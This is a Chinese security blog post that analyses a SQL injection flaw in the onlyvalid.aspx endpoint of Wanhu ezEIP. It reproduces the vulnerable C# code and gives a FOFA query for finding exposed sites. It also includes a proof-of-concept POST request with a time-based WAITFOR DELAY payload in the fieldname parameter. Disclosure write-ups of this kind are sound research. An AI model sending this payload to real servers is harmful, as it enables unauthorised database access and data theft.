---
title: "万户ezEIP onlyvalid.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/ezEIP-whir_system-onlyvalid-fieldname-sqli.html
asset_dir: assets/万户ezeip-onlyvalid.aspx-sql注入漏洞
---

# 万户ezEIP onlyvalid.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/22 08:20
* 1747浏览
* [0评论](#comment)
* 37分钟阅读

深入探索

ERP

sql

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万户ezEIP是一种企业资源规划软件，旨在帮助企业管理其各个方面的业务流程。它提供了一套集成的解决方案，涵盖了财务、供应链管理、销售和市场营销、人力资源等各个领域。万户ezEIP onlyvalid.aspx 接口处存在SQL注入漏洞，攻击者除了可以利用SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

# fofa语法

> app="万户网络-ezEIP" || (body="ezEIP"||header="ezEIP") && server="IIS"

# 漏洞分析

查看 Whir\_System/Ajax/content/onlyValid.aspx.cs 内容如下

```
public partial class whir_system_ajax_content_onlyValid : System.Web.UI.Page
{
    public int ColumnId { get; set; }
    public int PrimaryValue { get; set; }
    public string FieldName { get; set; }
    public string FieldValue { get; set; }

    protected void Page_Load(object sender, EventArgs e)
    {
        ColumnId = RequestUtil.Instance.GetQueryInt("columnid", 0);
        PrimaryValue = RequestUtil.Instance.GetQueryInt("primaryValue", 0);
        FieldName = RequestUtil.Instance.GetQueryString("fieldname");
        FieldValue = RequestUtil.Instance.GetQueryString("fieldvalue");

        if (FieldName.IsSafeSqlaParms())
            Response.Write("存在非法字符串！");
        else
            WriteExist();
    }

    private void WriteExist()
    {
        Model model = ServiceFactory.ModelService.GetModelByColumnId(ColumnId);
        if (model == null || FieldValue.IsEmpty())
        {
            Response.Write("{\"valid\":true}");
            return;
        }

        string sql = "SELECT COUNT(1) FROM {0} WHERE {1}=@0 AND {0}_PID<>@2 AND TypeID=@1".FormatWith(model.TableName, FieldName);
        int count = DbHelper.CurrentDb.ExecuteScalar<object>(sql, FieldValue, ColumnId, PrimaryValue).ToInt();
        if (count > 0)
        {
            Response.Write("{\"valid\":false}");
            return;
        }

        Response.Write("{\"valid\":true}");
        return;
    }
}
```

深入探索

防火墙软件

安全工具开发

云安全解决方案

四个参数中 ColumnId 和 PrimaryValue 均为 INT 整型，后两个 FieldName 和 FieldValue 为 string 型。

接下来有个 IsSafeSqlaParms() 判断 fieldvalue 是否安全，但是没有找到对应的函数。。。

继续往下看 WriteExist 函数

如果 GetModelByColumnId(ColumnId) 方法返回null或者fieldvalue值为空则直接打印`{"valid":true}` 然后返回结束流程。

否则进入 sql 语句处理

```
string sql = "SELECT COUNT(1) FROM {0} WHERE {1}=@0 AND {0}_PID<>@2 AND TypeID=@1".FormatWith(model.TableName, FieldName);
```

这里使用了类似于 .NET 中 string.Format 的自定义方法 `FormatWith` 对 SQL 模板字符串进行格式化替换。注意：

* 模板字符串中的 **{0}** 和 **{1}** 属于格式化占位符，它们的替换值由 FormatWith 方法提供。
* 根据传入的参数：
  + **{0}** 将被替换为 **model.TableName**
  + **{1}** 将被替换为 **FieldName**

格式化完成后的 SQL 语句（假设 model.TableName="Users"，FieldName="UserName"）变为：

```
SELECT COUNT(1) FROM Users WHERE UserName=@0 AND Users_PID<>@2 AND TypeID=@1
```

这里需要注意两点：

* 模板中的 **{0}** 和 **{1}** 均已被替换，得到实际的表名和字段名；
* **@0、@1、@2** 这三个仍保留在 SQL 字符串中，它们不是被 FormatWith 替换，而是数据库参数的占位符。

当前面提到的 model 满足条件后，这里的 FieldName 就存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，因为其直接拼接在 where 语句后作为条件拼接进SQL语句中。

再看紧接着的 ExecuteScalar 的参数绑定

```
int count = DbHelper.CurrentDb.ExecuteScalar<object>(sql, FieldValue, ColumnId, PrimaryValue).ToInt();
```

在这行代码中，通过 ADO.NET 的参数化查询方式，为 SQL 语句中参数占位符赋值。这里的参数和 SQL 语句中的 **@0、@1、@2** 是一一对应的（顺序对应）：

* 第一个参数 **FieldValue** 对应 SQL 语句中的 **@0** → 表示条件 "UserName=@0" 中，@0 绑定的是 FieldValue
* 第二个参数 **ColumnId** 对应 SQL 语句中的 **@1** → 表示条件 "TypeID=@1" 中，@1 绑定的是 ColumnId
* 第三个参数 **PrimaryValue** 对应 SQL 语句中的 **@2** → 表示条件 "Users\_PID<>@2" 中，@2 绑定的是 PrimaryValue

使用参数化查询的方式，且其中有两个参数还是 整型 ，因此这里不存在SQL注入漏洞。

总结下这两个SQL的处理就是：

首先，通过 FormatWith 方法，把 SQL 模板中的 {0} 与 {1} 分别替换为具体的表名和字段名；

接着，在执行 SQL 查询时，通过参数化查询，把 FieldValue、ColumnId、PrimaryValue 分别绑定给 SQL 中的参数 @0、@1、@2，从而构造出最终的查询语句并执行。

# 漏洞复现

条件：

* 一个存在的 columnid
* IsSafeSqlaParms()函数不存在或者绕过过滤 亦或过滤无效？

## POC

> 理论POC

```
POST /whir_system/ajax/content/onlyvalid.aspx HTTP/1.1
Host: ezeip.mrxn.net
Content-Type: application/x-www-form-urlencoded

fieldname=1%3d1;WAITFOR+DELAY'0:0:5'--&fieldvalue=1&columnid=1&primaryValue=1
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户ezEIP onlyvalid.aspx SQL注入漏洞](https://mrxn.net/jswz/ezEIP-whir_system-onlyvalid-fieldname-sqli.html)  
文章链接：<https://mrxn.net/jswz/ezEIP-whir_system-onlyvalid-fieldname-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ezEIP-whir\_system-onlyvalid-fieldname-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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